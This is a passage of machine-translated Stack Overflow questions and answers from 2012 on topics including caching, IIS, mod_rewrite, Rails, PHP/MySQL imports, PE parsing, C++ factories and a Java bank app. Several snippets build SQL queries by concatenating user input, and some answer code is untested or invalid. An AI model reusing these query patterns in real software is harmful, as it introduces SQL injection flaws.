这意味着`overflow-x: visible`将设置为`auto`当与`overflow-y: scroll`并因此隐藏溢出时。

# objective-c - 用于保存字符串或 NSNumber 的内存缓存

> ID：10676472
> 
> 赞同：1
> 
> 时间：2012-05-20T19:25:39.380
> 
> 标签：objective-c, ios, caching

是否有任何外部库可以进行内存缓存？如果没有的话，我只是想`NSDictionary`为此创建一个键值存储。我知道有`EGOCache`，但这会进行磁盘缓存。有任何想法吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T19:29:53.343

[NSCache](http://developer.apple.com/library/ios/#DOCUMENTATION/Cocoa/Reference/NSCache_Class/Reference/Reference.html)基本上就像一个 NSDictionary 有一些修改，让你根据优先级等清除数据。

# asp.net - ASP.NET 4.0 站点显示错误 - 缺少 ISAPI“限制”列

> ID：10676473
> 
> 赞同：1
> 
> 时间：2012-05-20T19:25:50.637
> 
> 标签：asp.net, .net, isapi, restriction

我的 ASP.NET（使用 .NET 4.0 运行）站点抛出错误。

错误：

由于 Web 服务器上的 ISAPI 和 CGI​​ 限制列表设置，无法提供您请求的页面。

我已经尝试执行本文中的步骤。我没有 CGI/ISAPI 选项，所以我点击了“ISAPI 过滤器”。“限制”栏似乎不见了。

[http://frejnorling.wordpress.com/2011/02/13/configure-iis-7-5-to-manage-asp-net-4-0-web-pages/](http://frejnorling.wordpress.com/2011/02/13/configure-iis-7-5-to-manage-asp-net-4-0-web-pages/)

![在此处输入图像描述](../Images/62a9553bda041fd182c4d6d07a939e2c.png)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T19:40:42.143

你找错地方了。您打开了“ISAPI 过滤器”功能，而不是“ISAPI 和 CGI​​ 限制”功能：

![IIS 管理器](../Images/3454c1ef602ceba77f2451d7f9a2662d.png)

打开该功能，您将看到限制列。

# apache - Mod重写字符串到图像目录

> ID：10676474
> 
> 赞同：1
> 
> 时间：2012-05-20T19:25:56.227
> 
> 标签：apache, mod-rewrite

我还没有找到任何解决这个搜索网络的方法。

我有一个站点（称为 example.com），它托管存储在 example.com/images/ 中的图像。

我想让用户通过地址 example.com/imagename 访问 example.com/images/imagename.jpg 上的图像。

图像名称由 az、AZ、0-9、- 和 _ 组成。

感谢任何解决方案！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T19:59:58.883

在主要的 Apache 配置（不是 .htaccess）中：

```
RewriteEngine On
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{DOCUMENT_ROOT}/images/%{REQUEST_URI}.jpg -f
RewriteRule ^/([a-zA-Z0-9_-]+)$ /images/$1.jpg 
```

这就是说“如果模式与所需的格式匹配，那么如果路径不是文件，并且路径不是目录，并且文档根目录下的图像文件夹中有一个文件，则该文件具有 '.jpg'附加然后执行重定向”。

如果您在 .htaccess 中执行此操作，那么您应该能够替换：

```
RewriteRule ^/([a-zA-Z0-9_-]+)$ /images/$1.jpg 
```

和

```
RewriteRule ^([a-zA-Z0-9_-]+)$ /images/$1.jpg 
```

但我没有机会对其进行测试（我有一个虚拟专用服务器并且不启用 .htaccess，因为我是唯一一个管理它的人，它减少了请求的开销）

# c++-cli - 导入本机 C++ 类

> ID：10676475
> 
> 赞同：1
> 
> 时间：2012-05-20T19:25:57.890
> 
> 标签：c++-cli

我有 c++/cli 类库项目。我需要导入 c++ 本机类。他们是这样声明的

```
class __declspec(dllexport) Check
{
   const char* type;
protected:
   int val;
public:
   Check(int);
   Check();
   const char* Type();
   void Type(const char*);
   virtual int Val();
   void Val(int);
   ~Check(){};
};

class __declspec(dllexport) Test:public Check
{
    const char* type;
public:
    Test(int x);
    int Val();
    ~Test(){};
}; 
```

如何将它们导入 c++/cli 项目？（我有 .dll 和 .lib 文件）

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T19:38:30.030

您不会“导入”本机代码，它没有任何类似于托管程序集中描述类型的元数据。

您必须以老式的方式执行此操作。您必须在源代码中使用 #include 来包含声明类的 .h 头文件。用#pragma managed(push, off) 和#pragma managed pop 包装这些#include，以确保编译器理解这些是本机代码声明。另请注意，您发布的声明不够好，这些类必须与 __declspec(dllimport) 属性一起出现。您通常为此使用宏。

您必须告诉链接器链接 .lib，即 DLL 的导入库。项目 + 属性、链接器、输入、附加依赖项设置。

您将在[此答案](https://stackoverflow.com/questions/2691325/c-cli-mixed-mode-dll-creation)中找到有关编写托管类包装器的更多提示。

# ruby-on-rails-3 - 为什么我的 current_user 辅助方法在测试期间不起作用？

> ID：10676477
> 
> 赞同：4
> 
> 时间：2012-05-20T19:26:14.437
> 
> 标签：ruby-on-rails-3, integration-testing, bdd

我有一个 Rails 3.2.3 应用程序，我正在使用 MiniTest 和 Capybara 运行我的集成测试。我推出了自己的身份验证，并在我的 application_controller.rb 中创建了 current_user helper_method。

当用户登录时，我的应用程序布局文件仅显示某些链接，例如注销等。

但是 current_user 方法在测试期间不起作用。它看起来像这样：

```
class ApplicationController < ActionController::Base
  protect_from_forgery
  private

  def authenticate
    if current_user.blank?
      redirect_to root_url, :alert => "You must first log in."
    end
  end

  def authenticate_admin
    unless current_user and current_user.admin?
      redirect_to root_url, :alert => "You must be logged in as an administrator to access     this feature."
    end
  end

  def current_user
    begin
      @current_user ||= User.find(session[:user_id]) if session[:user_id]
    rescue
      nil
    end
  end

  helper_method :current_user
end 
```

所以在我的 application.html.erb 文件中有：

```
<% unless current_user.blank? %>
 <li><%= link_to logout_path %></li> 
```

所以当我通过浏览器测试它时这有效，但在我的测试中无效。“current_user”最终为零。

我是 BDD 的新手，但是有什么东西会阻止在测试期间创建会话吗？我错过了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-20T21:30:30.673

> 注意：不包括控制器中定义的辅助方法。

从[这里](https://www.relishapp.com/rspec/rspec-rails/docs/helper-specs/helper-spec)。

解决方案是将它们组织在一个专门的助手类中。

# html - 使用凭据访问

> ID：10676478
> 
> 赞同：0
> 
> 时间：2012-05-20T19:26:15.020
> 
> 标签：html, url, google-chrome

我正在开发一个需要访问需要用户名和密码的 url 的网站。

到目前为止，我正在做的是使用数据访问 url，我的意思是：

> [http://USERNAME:PASSWORD@coolwebsite.com/securedContent](http://USERNAME:PASSWORD@coolwebsite.com/securedContent)

这适用于 Firefox 和 Google Chrome(18.0.1025.168m) 但是当我将它更新到 190.1084.46m 时不再工作了。

关于为什么它不再在那个 chrome 版本上工作的任何想法？或者任何其他方式来做到这一点？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T22:39:15.840

听起来这是 Chrome 团队有意识的决定。[根据此错误报告](http://code.google.com/p/chromium/issues/detail?id=123150)，较新版本的 Chrome 不再支持在 URL 中嵌入用户名/密码。

# ruby-on-rails-3 - has_many 通过 sql

> ID：10676487
> 
> 赞同：0
> 
> 时间：2012-05-20T19:27:47.253
> 
> 标签：ruby-on-rails-3, scope, has-many-through

我的模型是用户、练习和写作。

```
class User < ActiveRecord::Base
    has_many :exercises, :through => :writings
    has_many :writings
end

class Exercise < ActiveRecord::Base
    has_many :users, :through => :writings
    has_many :writings
end

class Writing < ActiveRecord::Base
    belongs_to :user
    belongs_to :exercise
    attr_accessible :writing_date, :exercise_id
end 
```

我的数据库/schema.rb

```
 ActiveRecord::Schema.define(:version => 20120517142448) do
   create_table "exercises", :force => true do |t|
     t.string   "etitle"
     t.text     "ebody"
     t.decimal  "average",             :precision => 3, :scale => 1
     t.datetime "created_at"
     t.datetime "updated_at"
   end
   create_table "users", :force => true do |t|
     t.string   "email",                                 :default => "",   :null => false
     t.datetime "created_at"
     t.datetime "updated_at"
     t.integer  "user_kind",                             :default => 0
   end
   create_table "writings", :force => true do |t|
     t.integer  "user_id"
     t.integer  "exercise_id"
     t.date     "writing_date"
     t.datetime "created_at"
     t.datetime "updated_at"
   end 
```

连接表正在写入。我尝试在每个练习视图（app/view/exercises/index.html.erb）上显示她的写作日期。每个user_id 通过写表有很多exercise_id。Writing 表上的每条记录都有writing_id、user_id、executive_id 和writing_date。在控制台中专门为executive_id我做了这样的：

```
1.9.2p290 :001 > @exercise = Exercise.find_by_id(9)
=> #<Exercise id: 9, etitle: "PLS51-2012-E01", ebody: "q", average: #<BigDecimal:53eeba8,'0.1E2',9(18)>, created_at: "2012-05-20 14:31:07", updated_at: "2012-05-20 14:34:27", askisi_file_name: nil, askisi_content_type: nil, askisi_file_size: nil, askisi_updated_at: nil> 
1.9.2p290 :002 > @exercise.writings
=> [#<Writing id: 6, user_id: 1, exercise_id: 9, writing_date: "2012-06-29", created_at: "2012-05-20 14:36:45", updated_at: "2012-05-20 14:36:45">, #<Writing id: 12, user_id: 7, exercise_id: 9, writing_date: "2012-06-20", created_at: "2012-05-20 14:40:12", updated_at: "2012-05-20 14:40:12">, #<Writing id: 13, user_id: 7, exercise_id: 9, writing_date: "2012-05-02", created_at: "2012-05-20 15:41:54", updated_at: "2012-05-20 15:41:54">] 
1.9.2p290 :003 > @exercise.writings.order("writing_date ASC")
=> [#<Writing id: 13, user_id: 7, exercise_id: 9, writing_date: "2012-05-02", created_at: "2012-05-20 15:41:54", updated_at: "2012-05-20 15:41:54">, #<Writing id: 12, user_id: 7, exercise_id: 9, writing_date: "2012-06-20", created_at: "2012-05-20 14:40:12", updated_at: "2012-05-20 14:40:12">, #<Writing id: 6, user_id: 1, exercise_id: 9, writing_date: "2012-06-29", created_at: "2012-05-20 14:36:45", updated_at: "2012-05-20 14:36:45">] 
1.9.2p290 :004 > @exercise.writings.order("writing_date ASC").last
 => #<Writing id: 6, user_id: 1, exercise_id: 9, writing_date: "2012-06-29", created_at: "2012-05-20 14:36:45", updated_at: "2012-05-20 14:36:45"> 
```

我需要范围吗？

提前致谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-05T22:05:47.620

最后，我的问题的解决方案可以帮助遇到同样情况的人，这很简单。文件 app/view/exercises/index.html.erb 代码：

```
 <%= exercise.writings.last.try(:writing_date) %> 
```

# php - 解析 CSV 并导入 PHP 很慢

> ID：10676490
> 
> 赞同：1
> 
> 时间：2012-05-20T19:28:05.427
> 
> 标签：php, mysql

我有一个 csv 文件，看起来像这样

```
col1, col2, col3
1 ,  John, ABC 
```

我需要`ABC`在第 3 列中解析为，`A,B,C`因为新关系需要`col1, col3 (each letter)`.

`$j`是行，`$i`是列。

```
$j = 0;  
while (($row = fgetcsv($handle, 1000, ',')) !== false) {
    $i = 0;
    $id = 0;
    foreach ($row as $field) {
        # save the id of each row
        if($j >0 && $i == 0){
            $id = $field;
        }

        # parse the third column for non-header rows)
        if($j > 0 && $i >= 3){
            $char_array = str_split($field);
            foreach($char_array as $value){
                //echo $value;
                //echo $id.$value."<br/>";
                mysql_query("INSERT INTO sample VALUES('".$id."', '".$value."')");
            }
        }
        $i = $i + 1;  # increment the column
    }
    $j = $j +1;   # move to the next row
} 
```

1.  这很慢。我有超过 720 行，其中大多数在第三列中有超过 5 个字符。`ABCDE`，所以我们平均有 720 x 5。这是一个巨大的数字。我明白了`timeout`。我可以更改本地执行的最长时间，但我需要在我的学生 linux 帐户上运行它。我没有那种特权。

2.  我怀疑是因为超时（这次没有说），我已经起来了`id = 502`。我错过了其余的（我最多有 720 行）。

我能做些什么？我只对第一列和第三列感兴趣。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-20T19:52:42.607

IO磁盘读/写也很慢。但它不会超时，并且使用缓存实际上您不会执行那么糟糕的操作。事实上，我一直这样做，在 PHP 中的数据大小超过 20MB。还不错……如果我真的想做大数据，我会使用 Python、C++ 算法，因为无论如何我都准备好了。

示例，基于您的代码（可能包含错误）：

```
$big = array(); 
$j = 0;
$k = 0;

while(....) {

    ....
    foreach($char_array as $value){
        #mysql_query("INSERT INTO sample VALUES('".$id."', '".$value."')");
        $big[$k][0] = $id;
        $big[$k][1] = $value;
        $k = $k+1;
    }

  ....
} 
```

在这里，您制作了一个嵌套数组。`$big`是外部数组，在内部分配列和行。

用于`fputcsv`写入新的 csv。根据您的规范，新的 csv 应该如下所示：

> 1、一个
> 
> 1、乙

这是写入 csv 的代码（来自 php doc）

```
$fp = fopen('new.csv', 'w');

foreach ($big as $fields) {
    fputcsv($fp, $fields);
}
fclose($fp);

} 
```

现在您可以将 csv 加载到数据库中。

* * *

编辑。我刚刚尝试了 720 行这样的数据，并复制和粘贴了 720 次。

```
1, ABCDEFGHIJK 
```

没花那么长时间......也许1-2秒。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-20T19:59:01.923

[未经测试]

```
$query = '';
$array = array();

if (($handle = fopen("file.csv", "r")) !== FALSE) {
    while (($row = fgetcsv($handle, 1000, ',')) !== false) {
        //$total = count($row);

        foreach ($row as $key=>$value) {
           $chrs = str_split($value[2]);
           foreach ($chrs as $chr){
               $array[] = {$value[0], $chr} ;
           }   
        }        
    }
}

foreach ($array as $key=>$value){
    $query .= 'INSERT INTO table VALUES ('.$value[0].', "'.$value[1].'")'; 
}
if ($query <> ''){
    mysql_query($query, $connection);
} 
```

# php - 生成唯一的随机字符串并插入数据库

> ID：10676493
> 
> 赞同：3
> 
> 时间：2012-05-20T19:28:22.547
> 
> 标签：php, mysql

我想编写一个 php 函数，该函数将创建 50000 个长度为 4 的唯一随机字母数字字符串并将其插入到 db 表中。我该怎么做？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-20T19:30:52.570

```
for($i = 0; $i < 50000; $i++)
    $pdo->exec("INSERT INTO table_x (the_string) VALUES (UUID());"); 
```

如此[处所述](http://dev.mysql.com/doc/refman/5.5/en/miscellaneous-functions.html#function_uuid)

编辑：替代插入方式（划线）

```
for($i = 0; $i < 50000; $i++)
    $pdo->exec("INSERT INTO table_x (the_string) VALUES (REPLACE(UUID(), '-', ''));"); 
```

## 编辑值得一提：

在单个服务器中，UUID 对地理位置和精确时间以及 sha-1 随机值进行编码。

因此，冲突的概率只存在于单独的服务器中（例如在合并它们的数据集时）。

只要我们不溢出地理/时隙的容量，就可以保证不会在本地创建重复值。

作为优化（数据库读取速度）的问题，将 UUID 转换为 binary(16) 字段（并使表中的列与该数据类型匹配）更快、更紧凑。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-20T19:42:37.243

此函数将使用您喜欢的任何字符集以及您需要的任何长度生成一个字母数字代码数组。它不会生成连续的重复字母。

```
function GenCodes($howmany=50000) {

 $charset = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
 $cl = strlen($charset);
 $codelength = 4;
 $result = array();
 $code = array();
 $lastchar = "";

 for ($x = 1; $x <=$howmany; $x++) {
    for ($i=1; $i<=$codelength; $i++) {
        while(($l = rand(1,$cl-1)) == $lastchar)
            ;
        $code[$i] = $charset[$l];
        $lastchar = $l;
    }
    $code = implode($code);
    $result[$x] = $code;
    $code = "";
    $lastchar = "";
  }
  return $result;
} 
```

这个会将它们保存到数据库表中，确保没有重复。

```
function SaveCodes($codes) {
 global $dbHost, $dbPort, $dbUser, $dbPass, $dbName;
 $insctr = 0;
 $db = new db($dbHost, $dbPort, $dbUser, $dbPass, $dbName);
 foreach($codes as $code) {

    $sql = "select code_id from codes where code_code='".$code."'";

    $result = $db->Query($sql);
    if ($db->NumRows() == 0) {  // don't generate an in-use code
        $sql = "insert into codes (code_code) values ('".$code."')";
        $result = $db->Query($sql);
        if ($result) {
            $insctr++;
        }
    }
 }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-20T19:34:38.703

[http://codepad.org/PoIHLzxE](http://codepad.org/PoIHLzxE) - 另一个简单的想法。更改为大于 2 的数字以生成更多；然后添加到数组并执行插入。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-20T20:28:51.137

使用 100 数字系统的字符串表示。数字将是 0、1、...、A、...、Z、...、a、...、z 这些只有 62 位数字，因此您应该使用其他 38 个字母数字字符，例如 Á á É é Ó ó Ö ö Ő ő Ú ú Ű ű 等等。每个四个字符串都应该是您的 100 个可能数字集的一部分。您从 0000 开始并随机添加一个数字，该数字在数字系统 10 中至少为 1，最大为 2000。添加的结果（表示为具有 100 数字系统中数字的抽象含义的字符串）将是你的第一个号码。从第二个数字开始，您应该通过将相同的随机偏移量（1 到 2000 之间）添加到最后生成的数字来生成所有数字。这样你的字符串将是独一无二的。

此外，您应该为插入生成批次，因为最好有 50 个插入，每个插入 1000 行，而不是有 50000 个数据库请求。

# java - 在java中解析PE头

> ID：10676496
> 
> 赞同：2
> 
> 时间：2012-05-20T19:28:43.680
> 
> 标签：java

我知道如何在内存中加载文件，但在 java 中我如何定义内存地址的结构？

我想要做的是解析一个 PE **(PORTABLE EXECUTABLE)**文件头。没有外部库我怎么能做到这一点。

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T19:43:47.173

如果我了解您想要什么，您正在尝试读取 PE 文件，但您没有该文件的任何机器可读定义。在 Java 中，您不能真正拥有一个只映射到任意内存的类，因此您必须只使用标头中数据的偏移量和大小来制作一堆常量。然后你可以创建一些类来使用这些常量来返回与你想要的内容相对应的正确字节。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-17T14:43:58.453

看看这个[https://code.google.com/p/jpexe/source/browse/src/com/google/code/jpexe/PEFile.java?spec=svn2a73c57c6e5532365ce12126efa7e902e4c759db&r=c674a40f25833836de99644ff7583e8c9c7d3dc6](https://code.google.com/p/jpexe/source/browse/src/com/google/code/jpexe/PEFile.java?spec=svn2a73c57c6e5532365ce12126efa7e902e4c759db&r=c674a40f25833836de99644ff7583e8c9c7d3dc6)

我在谷歌项目中找到了这个来源。我还没试过这个。我希望这会有用。我你有更好的解决方案在这里分享，我也在寻找相同的解决方案。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2016-12-09T03:07:49.143

试试 dorkbox PeParser：<a href="https://github.com/dorkbox/PeParser" rel="nofollow noreferrer">https://github.com/dorkbox/PeParser

```
PE pe = new PE("C:\\my.exe");
System.out.println(pe.isPE());
System.out.println(pe.getInfo()); 
```

# c++ - 工厂模式在编译时分配内存，以及如何打印编译时信息

> ID：10676498
> 
> 赞同：3
> 
> 时间：2012-05-20T19:28:59.077
> 
> 标签：c++, factory

我正在使用工厂模式。它基本上允许在编译时注册类并存储在映射中。然后可以使用 BaseFactory::createInstance() 返回一个实例

我不确定地图在编译时如何保存类名！如何在运行时有效的编译时分配内存？

在这种情况下，所有类都是从父类 Bump_BaseObject 派生的

```
//C++ STL used for adding Reflection
#include <string>
#include <map>

class Bump_BaseObject;

/**
 * Derived Base objects creation factory
 */
template<typename T>
Bump_BaseObject* createT(void)
{
#pragma message("createT instantiated")
    return new T();
}

struct BaseFactory {
    typedef std::map<std::string, Bump_BaseObject*(*)()> map_type;

    //return an instance of the class type 's'
    static Bump_BaseObject* createInstance(const std::string& s) {
        map_type::iterator it = getMap()->find(s);
        if(it == getMap()->end())
            return 0;

        //this is where we instatiate and allocate memory for the object(it must NOT have any arguments)
        //we could write a variant that accepts args, but there is no need.
        return it->second();
    }

    //check if 's' is present in the map of registered types
    static bool checkIfRegisteredType(const std::string& s) {
        map_type::iterator it = getMap()->find(s);
        if(it == getMap()->end())
            return false;

        return true;
    }

protected:
    static map_type* getMap() {
        // never delete'ed. (exist until program termination)
        // because we can't guarantee correct destruction order
        if(!objectMap) { objectMap = new map_type; }
        return objectMap;
    }

private:
    static map_type * objectMap;
};

#define VALUE_TO_STRING(x) #x

template<typename T>
struct DerivedRegister : BaseFactory {
    DerivedRegister(const std::string& s) {

#pragma message("Type registered")
        getMap()->insert(std::pair<std::string, Bump_BaseObject*(*)()>(s, &createT<T>));
    }
}; 
```

还有一种方法可以在注册类名时打印它们吗？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-05-20T20:58:25.920

我认为您的代码完全混乱，将预处理器指令与奇怪的继承模式混合在一起。我不想尝试修复它，而是想展示一个通用的自注册工厂框架（它将在注册发生时打印出来）。

请注意，所有全局初始化都发生在*动态初始化阶段*，即在运行时`main()`调用之前。

**基础.hpp：**

```
#include <unordered_map>
#include <string>

class Base
{
public:
    typedef Base * (*base_creator_fn)();
    typedef std::unordered_map<std::string, base_creator_fn> registry_map;

    virtual ~Base() = default;

    static registry_map & registry();
    static Base * instantiate(std::string const & name);
};

struct Registrar
{
    Registrar(std::string name, Base::base_creator_fn func);
}; 
```

**基础.cpp：**

```
#include "Base.hpp"
#include <iostream>

registry_map & Base::registry()
{
    static registry_map impl;
    return impl;
}

Base * Base::instantiate(std::string const & name)
{
    auto it = Base::registry().find(name);
    return it == Base::registry().end() ? nullptr : (it->second)();
}

Registrar::Registrar(std::string name, Base::base_creator_fn func)
{
    Base::registry()[name] = func;
    std::cout << "Registering class '" << name << "'\n";
} 
```

## 使用示例

**示例.hpp：**

```
#include "Base.hpp"

class DerivedExample : public Base
{
    static Registrar registrar;
public:
    static Base * create() { return new DerivedExample; }
    // ...
}; 
```

**示例.cpp：**

```
#include "Example.hpp"

Registrar DerivedExample::registrar("DerivedExample", DerivedExample::create); 
```

**主文件**

```
#include "Example.hpp"

int main()
{
    Base * p = Base::instantiate("DerivedExample");
    Base * q = Base::instantiate("AnotherExample");
} 
```

这里的关键是每个派生类都有一个静态`Registrar`成员，它在程序的动态初始化阶段被初始化（以未指定的顺序），每个构造函数执行实际插入注册表映射，以及打印出日志消息。

（如果您没有现代 C++ 编译器，则必须使用旧的 C++98 样式语法：）

```
virtual ~Base() { }   //  no "= default"

Base::registry_map::const_iterator it = Base::registry().find(name); // no "auto" 
```

# java - 具有透明png图像和背景颜色的Android按钮

> ID：10676507
> 
> 赞同：3
> 
> 时间：2012-05-20T19:29:57.783
> 
> 标签：java, android, button, imagebutton

我需要一个带有前景透明图像和背景颜色的按钮。所以有使用这个代码。背景颜色在图像之外。我需要与图像大小相同的按钮。

根据用户交互，我必须更改前景图像和背景颜色。我想分别添加图像和背景颜色，以便我可以以最低成本更改其中一个。我必须在这个 UI 中使用很多按钮，所以它将在 java 代码中完成。

```
layout = new TableLayout(this);
layout.setLayoutParams(new TableLayout.LayoutParams(8,7));
TableRow row2 = new TableRow(this);
buttonPlayer1 = new ImageButton(this);
buttonPlayer1.setImageDrawable(getResources().getDrawable(R.drawable.blankc4));
buttonPlayer1.setBackgroundColor(Color.GREEN);
row2.addView(buttonPlayer1);
layout.addView(row2); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T20:04:16.290

如果您唯一的问题是按钮背景颜色变得过大图像并且您需要按钮大小与图像大小相同，则使用图像对象上的 & 方法获取图像高度 和**宽度**，**并**使用这些值使**按钮大小**与使用**图像**大小相同&方法分别在按钮对象上。`getHeight()``getWidth()`****`setHeight()``setWidth()`****

 ****## 带有 LinearLayout 的示例代码：

* * *

```
 public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        LinearLayout btnLO = new LinearLayout(this);    
        btnLO.setOrientation(LinearLayout.VERTICAL);
        ImageButton i1 = new ImageButton(this);
        i1.setBackgroundColor(color.background_dark);
        i1.setImageDrawable(getResources().getDrawable(R.drawable.rana));   
        btnLO.addView(i1, new LinearLayout.LayoutParams(LayoutParams.WRAP_CONTENT,LayoutParams.WRAP_CONTENT));                      
  //    btnLO.setGravity(Gravity.LEFT | Gravity.CENTER_HORIZONTAL);     
        this.addContentView(btnLO, new LayoutParams(LayoutParams.WRAP_CONTENT,LayoutParams.WRAP_CONTENT)); 
    } 
```****

# java - 从数据库中获取数据但没有用 Java 中的正确数据填充文本框

> ID：10676513
> 
> 赞同：-2
> 
> 时间：2012-05-20T19:30:44.933
> 
> 标签：java

我正在创建一个银行应用程序，我可以在其中使用搜索文本字段在数据库中查找客户（我使用的是 MySQL 数据库）。当我输入一封信以按姓氏搜索客户时，应用程序确实从数据库中获取数据并将结果显示在 JList 中。就我而言，我的数据库中共有 5 条记录，其中 4 个姓氏以字母“S”开头，一个姓氏以字母“M”开头。一旦行或结果在 JList 中，我可以单击一行并使用正确的信息自动填充名字、姓氏、城市等文本字段。但是，我遇到了两个问题：

1.  就我而言，如果我按字母“S”搜索姓氏，我的 JList 将只显示数据库中的 4 条记录，这是正确的。当我从 JList 中选择一行时，它应该会自动用正确的信息填充所有文本字段。但是，如果我选择 JList 中的第一行，我的文本字段将始终填充 JList 中最后一行的信息。我在 JList 中选择哪一行并不重要，文本字段将始终用最后一行填充信息。

2.  如果我搜索字母“S”，我会得到 4 条记录，这是正确的。但是，当应用程序仍在运行时，我决​​定搜索字母“M”，我得到一条记录，这也是正确的，但如果我再次尝试搜索字母“S”，我只得到一条记录。为什么？应该是4。

这就是我想要完成的： [银行申请链接](http://www.google.com/imgres?q=java%20bank%20application&hl=en&biw=1093&bih=554&gbv=2&tbm=isch&tbnid=EpMYIv_UsCFERM%3a&imgrefurl=http://docs.oracle.com/javaee/5/tutorial/doc/bncna.html&docid=twBiK2zlYRjZ1M&imgurl=http://docs.oracle.com/javaee/5/tutorial/doc/figures/dukesbank-appClient.gif&w=551&h=642&ei=XkO5T72vL4Si8gT95MCRCg&zoom=1)

这是我的代码的一部分：

```
 // function that will search for records in the database
    private void searchRecord(){
        try {

            connect = DriverManager.getConnection(url,user,password);
            SQLStatement = connect.createStatement();
            Class.forName("com.mysql.jdbc.Driver");
            model.clear();
            String select = "SELECT * FROM customerinfo WHERE LastName LIKE '"+ txtSearch.getText().trim() +"%'";
            rows = SQLStatement.executeQuery(select);

            while(rows.next()){
                //model.addElement(rows.getString("LastName"));
                model.addElement(rows.getString("LastName") + ", " + rows.getString("FirstName") + " " + rows.getString("MiddleInitial") + ".");
            }

            rows.close();
            SQLStatement.close();
            connect.close();
        } catch (ClassNotFoundException e) {
            JOptionPane.showMessageDialog(this, "Where is your Mysql JDBC Driver?");
            e.printStackTrace();
        } catch (SQLException e){
            JOptionPane.showMessageDialog(this, "SQLException: " + e.getMessage());
            JOptionPane.showMessageDialog(this, "VendorError: " + e.getErrorCode());
        }

    }

    // Implement Action Listener
    private class handler implements ActionListener{

        @Override
        public void actionPerformed(ActionEvent event) {
            // if user clicks on New Customer Button, do the following...
            if(event.getSource() == newCustomer){
                checkForEmptyFields();
                insertDatabase();
                clearFields();
            } else if(event.getSource() == update){
                checkForEmptyFields();
                updateDatabase();
                clearFields();
            } else if(event.getSource() == remove){
                checkForEmptyFields();
                deleteRecord();
                clearFields();
            } else if(event.getSource() == cancel){
                clearFields();
            } else if(event.getSource() == open){

            } else if(event.getSource() == search){
                searchRecord();
            } 

        }
    }

    // function that will set the text fields
    private void setTextFields(int customerID, String firstName, String lastName, String middleInitial, String street, String city, String state, int zipCode, int phone, String email){
        String convertCustomerID = Integer.toString(customerID);
        txtCustomerID.setText(convertCustomerID);
        txtFirstName.setText(firstName);
        txtLastName.setText(lastName);
        txtMiddleInitial.setText(middleInitial);
        txtStreet.setText(street);
        txtCity.setText(city);
        txtState.setText(state);
        String convertZipCode = Integer.toString(zipCode);
        txtZip.setText(convertZipCode);
        String convertPhone = Integer.toString(phone);
        txtPhone.setText(convertPhone);
        txtEmail.setText(email);
    }

    // Implement List Selection Listener
    private class listener implements ListSelectionListener{
        @Override
        public void valueChanged(ListSelectionEvent event) {
                    try {
                        connect = DriverManager.getConnection(url,user,password);
                        SQLStatement = connect.createStatement();
                        String select = "SELECT * FROM customerinfo WHERE LastName LIKE '"+ txtSearch.getText().trim() + "%'";
                        rows = SQLStatement.executeQuery(select);

                        if(!event.getValueIsAdjusting()){

                                    while(rows.next()){
                                        setTextFields(rows.getInt("CustomerID"), rows.getString("FirstName"), rows.getString("LastName"), rows.getString("MiddleInitial"),
                                            rows.getString("Street"), rows.getString("City"), rows.getString("State"), rows.getInt("ZipCode"), rows.getInt("Phone"),
                                            rows.getString("Email"));
                                    }

                            }

                    } catch(Exception ex) {
                        JOptionPane.showMessageDialog(null, "Cannot get field values");
                    }
        }

    } 
```

必须是给我问题编号 1 的 rows.next()。 rows.next() 遍历数据库中的所有记录，在完成所有记录之后，它似乎停留在最后记录。不知何故，我需要重置位置，当我单击 JList 中的一行时，它应该等于具有相同值的行，并用正确的信息填充所有文本字段。

我已经尝试了一切，此时我已经放弃了！请帮我！谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-20T20:06:07.350

方法中的 SELECT 语句`valueChanged`将再次选择所有内容。您需要让它只选择您想要的记录。因此，您需要有一种方法来识别列表中所需的行（例如客户编号或其他内容），然后在响应选择事件时在 SELECT 语句中使用它以仅获取单个客户。

# jquery - 单击元素并重新加载页面后更改链接元素的样式？

> ID：10676516
> 
> 赞同：1
> 
> 时间：2012-05-20T19:30:56.123
> 
> 标签：jquery, css

我正在尝试想出一种方法来更改单击元素后的样式。在我的场景中，单击链接元素后，页面将重新加载，我想更改页面重新加载后单击的元素的样式。

我可以用一堆 php 条件语句来做到这一点，但这似乎有点矫枉过正，我想知道是否有人可以帮助我使用 JQuery 完成这个？

```
<div>               
    <a class="results-per-page" href="search.php?searchword=toys&resultsperpage=6"><div>6</div></a>
    <a class="results-per-page" href="search.php?searchword=toys&resultsperpage=12"><div>12</div></a>
    <a class="results-per-page" href="search.php?searchword=toys&resultsperpage=24"><div>24</div></a>
</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-20T19:38:34.727

使用 location.search 获取这部分 URL - "?searchword=toys&resultsperpage=6" - 然后您可以获得正确的 A 标记以突出显示。

jsFiddle 不能很好地处理查询字符串，但我设法为您创建了一个简单的示例，它使用 location.pathname 而不是 location.search 的类似方法，请在此处查看 - [http://jsfiddle.net/q5y7Z/ 7/](http://jsfiddle.net/q5y7Z/7/)

# android - 操作栏进度指示器和刷新按钮

> ID：10676517
> 
> 赞同：24
> 
> 时间：2012-05-20T19:31:17.437
> 
